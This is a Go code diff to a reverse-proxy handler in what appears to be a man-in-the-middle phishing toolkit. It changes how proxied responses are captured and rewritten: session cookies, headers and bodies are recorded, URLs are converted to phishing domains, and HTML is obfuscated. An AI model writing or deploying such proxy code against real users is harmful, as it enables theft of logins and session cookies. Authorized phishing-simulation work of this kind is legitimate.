@@ -818,14 +818,15 @@ func (m *ProxyHandler) processResponseWithContext(resp *http.Response, reqCtx *R
 	// handle responses with or without session
 	if reqCtx.SessionID != "" && reqCtx.Session != nil {
 		// capture response data before any rewriting
-		m.captureResponseDataWithContext(resp, reqCtx)
+		// this returns the body so we can reuse it in rewriting without reading twice
+		capturedBody, wasCompressed := m.captureResponseDataWithContext(resp, reqCtx)
 
 		// process cookies for phishing domain responses after capture
 		if reqCtx.PhishDomain != "" {
 			m.processCookiesForPhishingDomainWithContext(resp, reqCtx)
 		}
 
-		return m.processResponseWithSessionContext(resp, reqCtx)
+		return m.processResponseWithSessionContext(resp, reqCtx, capturedBody, wasCompressed)
 	}
 
 	// process cookies for phishing domain responses (no session case)
@@ -836,22 +837,24 @@ func (m *ProxyHandler) processResponseWithContext(resp *http.Response, reqCtx *R
 	return m.processResponseWithoutSessionContext(resp, reqCtx)
 }
 
-func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCtx *RequestContext) {
+func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCtx *RequestContext) (*[]byte, bool) {
 	// capture cookies, headers, and body
 	m.onResponseCookies(resp, reqCtx.Session)
 	m.onResponseHeader(resp, reqCtx.Session)
 
 	contentType := resp.Header.Get("Content-Type")
 	if m.shouldProcessContent(contentType) {
-		body, _, err := m.readAndDecompressBody(resp)
+		body, wasCompressed, err := m.readAndDecompressBody(resp)
 		if err == nil {
 			m.onResponseBody(resp, body, reqCtx.Session)
-			resp.Body = io.NopCloser(bytes.NewReader(body))
+			// return body and compression status so caller can reuse it
+			return &body, wasCompressed
 		}
 	}
+	return nil, false
 }
 
-func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
+func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext, capturedBody *[]byte, wasCompressed bool) *http.Response {
 	// set session cookie for new sessions
 	if reqCtx.SessionCreated {
 		// clear all existing cookies for initial MITM visit to ensure fresh start
@@ -871,7 +874,8 @@ func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, re
 
 	// apply response rewriting
 	m.rewriteResponseHeadersWithContext(resp, reqCtx)
-	m.rewriteResponseBodyWithContext(resp, reqCtx)
+	// pass the already-captured body to avoid reading twice
+	m.rewriteResponseBodyWithContext(resp, reqCtx, capturedBody, wasCompressed)
 
 	return resp
 }
@@ -978,17 +982,26 @@ func (m *ProxyHandler) applyCustomResponseHeaderReplacements(resp *http.Response
 	}
 }
 
-func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCtx *RequestContext) {
+func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCtx *RequestContext, capturedBody *[]byte, capturedWasCompressed bool) {
 	contentType := resp.Header.Get("Content-Type")
 	if !m.shouldProcessContent(contentType) {
 		return
 	}
 
-	defer resp.Body.Close()
-	body, wasCompressed, err := m.readAndDecompressBody(resp)
-	if err != nil {
-		m.logger.Errorw("failed to read and decompress response body", "error", err)
-		return
+	var body []byte
+	var err error
+
+	// use already-captured body if available to avoid double-read
+	if capturedBody != nil {
+		body = *capturedBody
+	} else {
+		// no captured body, read it now
+		defer resp.Body.Close()
+		body, _, err = m.readAndDecompressBody(resp)
+		if err != nil {
+			m.logger.Errorw("failed to read and decompress response body", "error", err)
+			return
+		}
 	}
 
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
@@ -1003,13 +1016,16 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 				m.logger.Errorw("failed to obfuscate html", "error", err)
 			} else {
 				body = []byte(obfuscated)
-				// obfuscated content is already compressed, don't re-compress
-				wasCompressed = false
 			}
 		}
 	}
 
-	m.updateResponseBody(resp, body, wasCompressed)
+	// send uncompressed body to browser - let go's http server handle compression
+	resp.Body = io.NopCloser(bytes.NewReader(body))
+	resp.ContentLength = int64(len(body))
+	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
+	// remove content-encoding header since we're sending uncompressed
+	resp.Header.Del("Content-Encoding")
 	resp.Header.Set("Cache-Control", "no-cache, no-store")
 }
 
@@ -2239,40 +2255,15 @@ func (m *ProxyHandler) readAndDecompressBody(resp *http.Response) ([]byte, bool,
 	}
 }
 
+// updateResponseBody is deprecated - kept for compatibility with non-session responses
+// new code should set body directly without re-compression
 func (m *ProxyHandler) updateResponseBody(resp *http.Response, body []byte, wasCompressed bool) {
-	if wasCompressed {
-		encoding := resp.Header.Get("Content-Encoding")
-		switch strings.ToLower(encoding) {
-		case "gzip":
-			var compressedBuffer bytes.Buffer
-			gzipWriter := gzip.NewWriter(&compressedBuffer)
-			if _, err := gzipWriter.Write(body); err != nil {
-				m.logger.Errorw("failed to write gzip compressed body", "error", err)
-			}
-			if err := gzipWriter.Close(); err != nil {
-				m.logger.Errorw("failed to close gzip writer", "error", err)
-			}
-			body = compressedBuffer.Bytes()
-		case "deflate":
-			var compressedBuffer bytes.Buffer
-			deflateWriter, err := flate.NewWriter(&compressedBuffer, flate.DefaultCompression)
-			if err != nil {
-				m.logger.Errorw("failed to create deflate writer", "error", err)
-				break
-			}
-			if _, err := deflateWriter.Write(body); err != nil {
-				m.logger.Errorw("failed to write deflate compressed body", "error", err)
-			}
-			if err := deflateWriter.Close(); err != nil {
-				m.logger.Errorw("failed to close deflate writer", "error", err)
-			}
-			body = compressedBuffer.Bytes()
-		}
-	}
-
+	// send uncompressed body - let go's http server handle compression
 	resp.Body = io.NopCloser(bytes.NewReader(body))
 	resp.ContentLength = int64(len(body))
 	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
+	// remove content-encoding since we're sending uncompressed
+	resp.Header.Del("Content-Encoding")
 }
 
 func (m *ProxyHandler) shouldProcessContent(contentType string) bool {
